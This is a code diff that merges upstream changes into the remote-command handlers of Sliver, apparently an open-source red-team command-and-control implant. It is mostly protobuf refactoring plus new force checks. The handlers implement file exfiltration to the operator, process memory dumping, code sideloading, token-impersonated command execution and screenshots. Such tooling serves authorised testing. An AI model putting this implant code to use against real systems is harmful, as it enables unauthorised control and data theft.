Merge upstream

+++ sliver/handlers/generic-rpc-handlers.go
@@ -44,19 +44,19 @@ import (
 	"os"
 	"path/filepath"
 
-	pb "github.com/bishopfox/sliver/protobuf/sliver"
+	"github.com/bishopfox/sliver/protobuf/commonpb"
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/bishopfox/sliver/sliver/netstat"
 	"github.com/bishopfox/sliver/sliver/procdump"
 	"github.com/bishopfox/sliver/sliver/ps"
-	"github.com/bishopfox/sliver/sliver/taskrunner"
 	screen "github.com/bishopfox/sliver/sliver/sc"
-
+	"github.com/bishopfox/sliver/sliver/taskrunner"
 
 	"github.com/golang/protobuf/proto"
 )
 
 func pingHandler(data []byte, resp RPCResponse) {
-	ping := &pb.Ping{}
+	ping := &sliverpb.Ping{}
 	err := proto.Unmarshal(data, ping)
 	if err != nil {
 		// {{if .Debug}}
@@ -72,7 +72,7 @@ func pingHandler(data []byte, resp RPCResponse) {
 }
 
 func psHandler(data []byte, resp RPCResponse) {
-	psListReq := &pb.PsReq{}
+	psListReq := &sliverpb.PsReq{}
 	err := proto.Unmarshal(data, psListReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -87,12 +87,12 @@ func psHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 	}
 
-	psList := &pb.Ps{
-		Processes: []*pb.Process{},
+	psList := &sliverpb.Ps{
+		Processes: []*commonpb.Process{},
 	}
 
 	for _, proc := range procs {
-		psList.Processes = append(psList.Processes, &pb.Process{
+		psList.Processes = append(psList.Processes, &commonpb.Process{
 			Pid:        int32(proc.Pid()),
 			Ppid:       int32(proc.PPid()),
 			Executable: proc.Executable(),
@@ -104,8 +104,8 @@ func psHandler(data []byte, resp RPCResponse) {
 }
 
 func terminateHandler(data []byte, resp RPCResponse) {
-	var errStr string
-	terminateReq := &pb.TerminateReq{}
+
+	terminateReq := &sliverpb.TerminateReq{}
 	err := proto.Unmarshal(data, terminateReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -113,23 +113,31 @@ func terminateHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 		return
 	}
-	err = ps.Kill(int(terminateReq.Pid))
-	if err != nil {
-		// {{if .Debug}}
-		log.Printf("failed to list procs %v", err)
-		// {{end}}
-		errStr = err.Error()
+
+	var errStr string
+	if int(terminateReq.Pid) <= 1 && !terminateReq.Force {
+		errStr = "Cowardly refusing to terminate process without force"
+	} else {
+		err = ps.Kill(int(terminateReq.Pid))
+		if err != nil {
+			// {{if .Debug}}
+			log.Printf("Failed to kill process %s", err)
+			// {{end}}
+			errStr = err.Error()
+		}
 	}
 
-	termResp := &pb.Terminate{
-		Err: errStr,
-	}
-	data, err = proto.Marshal(termResp)
+	data, err = proto.Marshal(&sliverpb.Terminate{
+		Pid: terminateReq.Pid,
+		Response: &commonpb.Response{
+			Err: errStr,
+		},
+	})
 	resp(data, err)
 }
 
 func dirListHandler(data []byte, resp RPCResponse) {
-	dirListReq := &pb.LsReq{}
+	dirListReq := &sliverpb.LsReq{}
 	err := proto.Unmarshal(data, dirListReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -140,15 +148,15 @@ func dirListHandler(data []byte, resp RPCResponse) {
 	dir, files, err := getDirList(dirListReq.Path)
 
 	// Convert directory listing to protobuf
-	dirList := &pb.Ls{Path: dir}
+	dirList := &sliverpb.Ls{Path: dir}
 	if err == nil {
 		dirList.Exists = true
 	} else {
 		dirList.Exists = false
 	}
-	dirList.Files = []*pb.FileInfo{}
+	dirList.Files = []*sliverpb.FileInfo{}
 	for _, fileInfo := range files {
-		dirList.Files = append(dirList.Files, &pb.FileInfo{
+		dirList.Files = append(dirList.Files, &sliverpb.FileInfo{
 			Name:  fileInfo.Name(),
 			IsDir: fileInfo.IsDir(),
 			Size:  fileInfo.Size(),
@@ -170,7 +178,7 @@ func getDirList(target string) (string, []os.FileInfo, error) {
 }
 
 func rmHandler(data []byte, resp RPCResponse) {
-	rmReq := &pb.RmReq{}
+	rmReq := &sliverpb.RmReq{}
 	err := proto.Unmarshal(data, rmReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -179,21 +187,31 @@ func rmHandler(data []byte, resp RPCResponse) {
 		return
 	}
 
-	rm := &pb.Rm{}
+	rm := &sliverpb.Rm{}
 	target, _ := filepath.Abs(rmReq.Path)
 	rm.Path = target
 	_, err = os.Stat(target)
 	if err == nil {
-		err = os.RemoveAll(target)
-		if err == nil {
-			rm.Success = true
+		if (target == "/" || target == "C:\\") && !rmReq.Force {
+			err = errors.New("Cowardly refusing to remove volume root without force")
+		}
+	}
+
+	rm.Response = &commonpb.Response{}
+	if err == nil {
+		if rmReq.Recursive {
+			err = os.RemoveAll(target)
+			if err != nil {
+				rm.Response.Err = err.Error()
+			}
 		} else {
-			rm.Success = false
-			rm.Err = fmt.Sprintf("%v", err)
+			err = os.Remove(target)
+			if err != nil {
+				rm.Response.Err = err.Error()
+			}
 		}
 	} else {
-		rm.Success = false
-		rm.Err = fmt.Sprintf("%v", err)
+		rm.Response.Err = err.Error()
 	}
 
 	data, err = proto.Marshal(rm)
@@ -201,7 +219,7 @@ func rmHandler(data []byte, resp RPCResponse) {
 }
 
 func mkdirHandler(data []byte, resp RPCResponse) {
-	mkdirReq := &pb.MkdirReq{}
+	mkdirReq := &sliverpb.MkdirReq{}
 	err := proto.Unmarshal(data, mkdirReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -210,24 +228,22 @@ func mkdirHandler(data []byte, resp RPCResponse) {
 		return
 	}
 
-	mkdir := &pb.Mkdir{}
+	mkdir := &sliverpb.Mkdir{}
 	target, _ := filepath.Abs(mkdirReq.Path)
 	mkdir.Path = target
 
-	err = os.MkdirAll(target, os.ModePerm)
-	if err == nil {
-		mkdir.Success = true
-	} else {
-		mkdir.Success = false
-		mkdir.Err = fmt.Sprintf("%v", err)
+	err = os.MkdirAll(target, 0700)
+	if err != nil {
+		mkdir.Response = &commonpb.Response{
+			Err: err.Error(),
+		}
 	}
-
 	data, err = proto.Marshal(mkdir)
 	resp(data, err)
 }
 
 func cdHandler(data []byte, resp RPCResponse) {
-	cdReq := &pb.CdReq{}
+	cdReq := &sliverpb.CdReq{}
 	err := proto.Unmarshal(data, cdReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -239,7 +255,7 @@ func cdHandler(data []byte, resp RPCResponse) {
 
 	os.Chdir(cdReq.Path)
 	dir, err := os.Getwd()
-	pwd := &pb.Pwd{Path: dir}
+	pwd := &sliverpb.Pwd{Path: dir}
 	if err != nil {
 		resp([]byte{}, err)
 		return
@@ -254,7 +270,7 @@ func cdHandler(data []byte, resp RPCResponse) {
 }
 
 func pwdHandler(data []byte, resp RPCResponse) {
-	pwdReq := &pb.PwdReq{}
+	pwdReq := &sliverpb.PwdReq{}
 	err := proto.Unmarshal(data, pwdReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -265,9 +281,11 @@ func pwdHandler(data []byte, resp RPCResponse) {
 	}
 
 	dir, err := os.Getwd()
-	pwd := &pb.Pwd{Path: dir}
+	pwd := &sliverpb.Pwd{Path: dir}
 	if err != nil {
-		pwd.Err = fmt.Sprintf("%v", err)
+		pwd.Response = &commonpb.Response{
+			Err: err.Error(),
+		}
 	}
 
 	data, err = proto.Marshal(pwd)
@@ -277,7 +295,7 @@ func pwdHandler(data []byte, resp RPCResponse) {
 // Send a file back to the hive
 func downloadHandler(data []byte, resp RPCResponse) {
 	var rawData []byte
-	downloadReq := &pb.DownloadReq{}
+	downloadReq := &sliverpb.DownloadReq{}
 	err := proto.Unmarshal(data, downloadReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -298,23 +316,29 @@ func downloadHandler(data []byte, resp RPCResponse) {
 	if fi.IsDir() {
 		var dirData bytes.Buffer
 		err = compressDir(target, &dirData)
+		// {{if .Debug}}
+		log.Printf("error creating the archive: %v", err)
+		// {{end}}
 		rawData = dirData.Bytes()
 	} else {
 		rawData, err = ioutil.ReadFile(target)
 	}
 
-	var download *pb.Download
+	var download *sliverpb.Download
 	if err == nil {
 		gzipData := bytes.NewBuffer([]byte{})
 		gzipWrite(gzipData, rawData)
-		download = &pb.Download{
+		download = &sliverpb.Download{
 			Path:    target,
 			Data:    gzipData.Bytes(),
 			Encoder: "gzip",
 			Exists:  true,
 		}
 	} else {
-		download = &pb.Download{Path: target, Exists: false}
+		download = &sliverpb.Download{Path: target, Exists: false}
+		download.Response = &commonpb.Response{
+			Err: fmt.Sprintf("%v", err),
+		}
 	}
 
 	data, _ = proto.Marshal(download)
@@ -322,7 +346,7 @@ func downloadHandler(data []byte, resp RPCResponse) {
 }
 
 func uploadHandler(data []byte, resp RPCResponse) {
-	uploadReq := &pb.UploadReq{}
+	uploadReq := &sliverpb.UploadReq{}
 	err := proto.Unmarshal(data, uploadReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -333,20 +357,22 @@ func uploadHandler(data []byte, resp RPCResponse) {
 	}
 
 	uploadPath, _ := filepath.Abs(uploadReq.Path)
-	upload := &pb.Upload{Path: uploadPath}
+	upload := &sliverpb.Upload{Path: uploadPath}
 	f, err := os.Create(uploadPath)
 	if err != nil {
-		upload.Err = fmt.Sprintf("%v", err)
-		upload.Success = false
+		upload.Response = &commonpb.Response{
+			Err: fmt.Sprintf("%v", err),
+		}
+
 	} else {
 		defer f.Close()
 		data, err := gzipRead(uploadReq.Data)
 		if err != nil {
-			upload.Err = fmt.Sprintf("%v", err)
-			upload.Success = false
+			upload.Response = &commonpb.Response{
+				Err: fmt.Sprintf("%v", err),
+			}
 		} else {
 			f.Write(data)
-			upload.Success = true
 		}
 	}
 
@@ -355,7 +381,7 @@ func uploadHandler(data []byte, resp RPCResponse) {
 }
 
 func dumpHandler(data []byte, resp RPCResponse) {
-	procDumpReq := &pb.ProcessDumpReq{}
+	procDumpReq := &sliverpb.ProcessDumpReq{}
 	err := proto.Unmarshal(data, procDumpReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -364,11 +390,11 @@ func dumpHandler(data []byte, resp RPCResponse) {
 		return
 	}
 	res, err := procdump.DumpProcess(procDumpReq.Pid)
-	dumpResp := &pb.ProcessDump{Data: res.Data()}
-	if err == nil {
-		dumpResp.Err = ""
-	} else {
-		dumpResp.Err = fmt.Sprintf("%v", err)
+	dumpResp := &sliverpb.ProcessDump{Data: res.Data()}
+	if err != nil {
+		dumpResp.Response = &commonpb.Response{
+			Err: fmt.Sprintf("%v", err),
+		}
 	}
 	data, err = proto.Marshal(dumpResp)
 	resp(data, err)
@@ -376,7 +402,7 @@ func dumpHandler(data []byte, resp RPCResponse) {
 
 func taskHandler(data []byte, resp RPCResponse) {
 	var err error
-	task := &pb.Task{}
+	task := &sliverpb.TaskReq{}
 	err = proto.Unmarshal(data, task)
 	if err != nil {
 		// {{if .Debug}}
@@ -393,33 +419,22 @@ func taskHandler(data []byte, resp RPCResponse) {
 	resp([]byte{}, err)
 }
 
-func remoteTaskHandler(data []byte, resp RPCResponse) {
-	remoteTask := &pb.RemoteTask{}
-	err := proto.Unmarshal(data, remoteTask)
-	if err != nil {
-		// {{if .Debug}}
-		log.Printf("error decoding message: %v", err)
-		// {{end}}
-		return
-	}
-	err = taskrunner.RemoteTask(int(remoteTask.Pid), remoteTask.Data, remoteTask.RWXPages)
-	resp([]byte{}, err)
-}
-
 func sideloadHandler(data []byte, resp RPCResponse) {
-	sideloadReq := &pb.SideloadReq{}
+	sideloadReq := &sliverpb.SideloadReq{}
 	err := proto.Unmarshal(data, sideloadReq)
 	if err != nil {
 		return
 	}
-	result, err := taskrunner.Sideload(sideloadReq.GetProcName(), sideloadReq.GetData(), sideloadReq.GetArgs())
+	result, err := taskrunner.Sideload(sideloadReq.GetProcessName(), sideloadReq.GetData(), sideloadReq.GetArgs())
 	errStr := ""
 	if err != nil {
 		errStr = err.Error()
 	}
-	sideloadResp := &pb.Sideload{
+	sideloadResp := &sliverpb.Sideload{
 		Result: result,
-		Error:  errStr,
+		Response: &commonpb.Response{
+			Err: errStr,
+		},
 	}
 	data, err = proto.Marshal(sideloadResp)
 	resp(data, err)
@@ -434,17 +449,17 @@ func ifconfigHandler(_ []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
-func ifconfig() *pb.Ifconfig {
+func ifconfig() *sliverpb.Ifconfig {
 	netInterfaces, err := net.Interfaces()
 	if err != nil {
 		return nil
 	}
 
-	interfaces := &pb.Ifconfig{
-		NetInterfaces: []*pb.NetInterface{},
+	interfaces := &sliverpb.Ifconfig{
+		NetInterfaces: []*sliverpb.NetInterface{},
 	}
 	for _, iface := range netInterfaces {
-		netIface := &pb.NetInterface{
+		netIface := &sliverpb.NetInterface{
 			Index: int32(iface.Index),
 			Name:  iface.Name,
 		}
@@ -467,7 +482,7 @@ func executeHandler(data []byte, resp RPCResponse) {
 		err error
 		cmd *exec.Cmd
 	)
-	execReq := &pb.ExecuteReq{}
+	execReq := &sliverpb.ExecuteReq{}
 	err = proto.Unmarshal(data, execReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -475,40 +490,44 @@ func executeHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 		return
 	}
-	execResp := &pb.Execute{}
-	cmd = exec.Command(execReq.Path)
+	execResp := &sliverpb.Execute{}
+	if len(execReq.Args) != 0 {
+		cmd = exec.Command(execReq.Path, execReq.Args...)
+	} else {
+		cmd = exec.Command(execReq.Path)
+	}
 	//{{if eq .GOOS "windows"}}
 	cmd.SysProcAttr = &windows.SysProcAttr{
 		Token: syscall.Token(priv.CurrentToken),
 	}
 	//{{end}}
 
-	if len(execReq.Args) != 0 {
-		cmd.Args = execReq.Args
-	}
 	if execReq.Output {
 		res, err := cmd.Output()
 		//{{if .Debug}}
 		log.Println(string(res))
 		//{{end}}
 		if err != nil {
-			execResp.Error = err.Error()
+			execResp.Response = &commonpb.Response{
+				Err: fmt.Sprintf("%s", err),
+			}
 		} else {
 			execResp.Result = string(res)
 		}
 	} else {
 		err = cmd.Start()
 		if err != nil {
-			execResp.Error = err.Error()
+			execResp.Response = &commonpb.Response{
+				Err: fmt.Sprintf("%s", err),
+			}
 		}
 	}
 	data, err = proto.Marshal(execResp)
 	resp(data, err)
 }
 
-
 func screenshotHandler(data []byte, resp RPCResponse) {
-	sc := &pb.Screenshot{}
+	sc := &sliverpb.Screenshot{}
 	err := proto.Unmarshal(data, sc)
 	if err != nil {
 		// {{if .Debug}}
@@ -520,7 +539,6 @@ func screenshotHandler(data []byte, resp RPCResponse) {
 	log.Printf("Screenshot Request")
 	// {{end}}
 
-
 	sc.Data = screen.Capture()
 	data, err = proto.Marshal(sc)
 
@@ -528,7 +546,7 @@ func screenshotHandler(data []byte, resp RPCResponse) {
 }
 
 func netstatHandler(data []byte, resp RPCResponse) {
-	netstatReq := &pb.NetstatRequest{}
+	netstatReq := &sliverpb.NetstatReq{}
 	err := proto.Unmarshal(data, netstatReq)
 	if err != nil {
 		//{{if .Debug}}
@@ -537,8 +555,8 @@ func netstatHandler(data []byte, resp RPCResponse) {
 		return
 	}
 
-	result := &pb.NetstatResponse{}
-	entries := make([]*pb.SockTabEntry, 0)
+	result := &sliverpb.Netstat{}
+	entries := make([]*sliverpb.SockTabEntry, 0)
 
 	if netstatReq.UDP {
 		if netstatReq.IP4 {
@@ -603,8 +621,8 @@ func netstatHandler(data []byte, resp RPCResponse) {
 	}
 }
 
-func buildEntries(proto string, s []netstat.SockTabEntry) []*pb.SockTabEntry {
-	entries := make([]*pb.SockTabEntry, 0)
+func buildEntries(proto string, s []netstat.SockTabEntry) []*sliverpb.SockTabEntry {
+	entries := make([]*sliverpb.SockTabEntry, 0)
 	for _, e := range s {
 		var (
 			pid  int32
@@ -614,22 +632,22 @@ func buildEntries(proto string, s []netstat.SockTabEntry) []*pb.SockTabEntry {
 			pid = int32(e.Process.Pid)
 			exec = e.Process.Name
 		}
-		entries = append(entries, &pb.SockTabEntry{
-			LocalAddr: &pb.SockTabEntry_SockAddr{
+		entries = append(entries, &sliverpb.SockTabEntry{
+			LocalAddr: &sliverpb.SockTabEntry_SockAddr{
 				Ip:   e.LocalAddr.String(),
 				Port: uint32(e.LocalAddr.Port),
 			},
-			RemoteAddr: &pb.SockTabEntry_SockAddr{
+			RemoteAddr: &sliverpb.SockTabEntry_SockAddr{
 				Ip:   e.RemoteAddr.String(),
 				Port: uint32(e.RemoteAddr.Port),
 			},
 			SkState: e.State.String(),
 			UID:     e.UID,
-			Proc: &pb.Process{
+			Process: &commonpb.Process{
 				Pid:        pid,
 				Executable: exec,
 			},
-			Proto: proto,
+			Protocol: proto,
 		})
 	}
 	return entries
@@ -661,11 +679,25 @@ func compressDir(path string, buf io.Writer) error {
 	tarWriter := tar.NewWriter(zipWriter)
 
 	filepath.Walk(path, func(file string, fi os.FileInfo, err error) error {
+		fileName := file
+		// If the file is a SymLink replace fileInfo and path with the symlink destination.
+		if fi.Mode()&os.ModeSymlink == os.ModeSymlink {
+			file, err = filepath.EvalSymlinks(file)
+			if err != nil {
+				return err
+			}
+
+			fi, err = os.Lstat(file)
+			if err != nil {
+				return err
+			}
+		}
 		header, err := tar.FileInfoHeader(fi, file)
 		if err != nil {
 			return err
 		}
-		header.Name = filepath.ToSlash(file)
+		// Keep the symlink file path for the header name.
+		header.Name = filepath.ToSlash(fileName)
 		if err := tarWriter.WriteHeader(header); err != nil {
 			return err
 		}
